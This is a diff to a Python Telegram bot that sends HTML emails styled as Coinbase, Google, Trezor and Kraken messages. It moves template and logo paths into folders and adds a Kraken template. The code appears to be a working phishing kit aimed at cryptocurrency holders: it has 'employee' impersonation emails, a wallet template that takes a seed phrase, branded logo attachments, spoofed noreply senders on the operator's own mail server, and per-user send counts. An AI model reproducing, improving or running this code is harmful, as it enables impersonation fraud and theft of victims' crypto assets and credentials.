@@ -64,12 +64,14 @@ global_email_count = 0
 user_email_counts = {}
 whitelisted_users = []
 
-HTML_TEMPLATE_PATH = "coinbase_template.html"
-HTML_WALLET_TEMPLATE_PATH = "coinbase_wallet_template.html"
-HTML_SECURE_TEMPLATE_PATH = "coinbase_secure_template.html"
-HTML_GOOGLE_TEMPLATE_PATH = "google_template.html"
-HTML_TREZOR_TEMPLATE_PATH = "trezor.html"
-HTML_DELAY_TEMPLATE_PATH = "coinbase_transaction.html"
+# Updated template paths using organized aot1o6 structure
+HTML_TEMPLATE_PATH = "templates/coinbase/emp.html"  # Employee Coinbase
+HTML_WALLET_TEMPLATE_PATH = "templates/coinbase/seed.html"  # Wallet/Seed template
+HTML_SECURE_TEMPLATE_PATH = "templates/coinbase/panel.html"  # Security panel
+HTML_GOOGLE_TEMPLATE_PATH = "templates/google/google.html"  # Google template
+HTML_TREZOR_TEMPLATE_PATH = "templates/trezor/trezor.html"  # Trezor template
+HTML_DELAY_TEMPLATE_PATH = "templates/coinbase/delay.html"  # Delay template
+HTML_KRAKEN_TEMPLATE_PATH = "templates/kraken/kraken.html"  # Kraken template
 balance_file = "balance.json"
 user_balances = {}
 
@@ -624,7 +626,7 @@ async def send_employee_coinbase_email(
 
     try:
   
-        with open("coinbase.png", "rb") as img_file:
+        with open("images/coinbase.png", "rb") as img_file:
             img = MIMEImage(img_file.read(), name="coinbase.png")
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
@@ -667,7 +669,7 @@ async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_e
     msg.attach(html_part)
 
     try:
-        with open("wallet.png", "rb") as img_file:
+        with open("images/wallet.png", "rb") as img_file:
             img = MIMEImage(img_file.read(), name="wallet_coinbase.png")
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
@@ -710,7 +712,7 @@ async def send_secure_coinbase_email(
 
 
     try:
-        with open("coinbase.png", "rb") as img_file:
+        with open("images/coinbase.png", "rb") as img_file:
             img = MIMEImage(img_file.read(), name="coinbase.png")
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
@@ -761,7 +763,7 @@ async def send_employee_google_email(
 
 
     try:
-        with open("google_logo.png", "rb") as img_file:
+        with open("images/google_logo.png", "rb") as img_file:
             img = MIMEImage(img_file.read(), name="google_logo.png")
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
@@ -836,7 +838,7 @@ async def send_employee_trezor_email(
 
     try:
      
-        with open("trezor.png", "rb") as img_file:
+        with open("images/trezor.png", "rb") as img_file:
            
             img = MIMEImage(img_file.read(), name="trezor.png")
             img.add_header("Content-ID", "<logo>")
@@ -881,7 +883,7 @@ async def send_employee_kraken_email(
         {"representative": representative, "case_id": case_id},
     )
 
-    template_path = "kraken.html"
+    template_path = HTML_KRAKEN_TEMPLATE_PATH
 
     if not os.path.exists(template_path):
         return "Failed to send email. Template file not found."
@@ -902,17 +904,12 @@ async def send_employee_kraken_email(
     html_part = MIMEText(html_body, "html", "utf-8")
     msg.attach(html_part)
 
-
-    for image in ["kraken.png", "kraken1.png", "kraken2.png"]:
-        try:
-            with open(image, "rb") as img_file:
+    try:
+        for image in ["kraken.png", "kraken1.png", "kraken2.png"]:
+            with open(f"images/{image}", "rb") as img_file:
                 img = MIMEImage(img_file.read(), name=image)
                 img.add_header("Content-ID", f"<{image}>")
                 msg.attach(img)
-        except Exception as e:
-            return f"Failed to attach the image {image}: {e}"
-
-    try:
         send_email_through_smtp(
             "Kraken",
             f"noreply@{postfix_config['domain']}",
@@ -972,7 +969,7 @@ async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAUL
     msg.attach(html_part)
 
     try:
-        with open("coinbase.png", "rb") as img_file:
+        with open("images/coinbase.png", "rb") as img_file:
             img = MIMEImage(img_file.read(), name="coinbase.png")
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
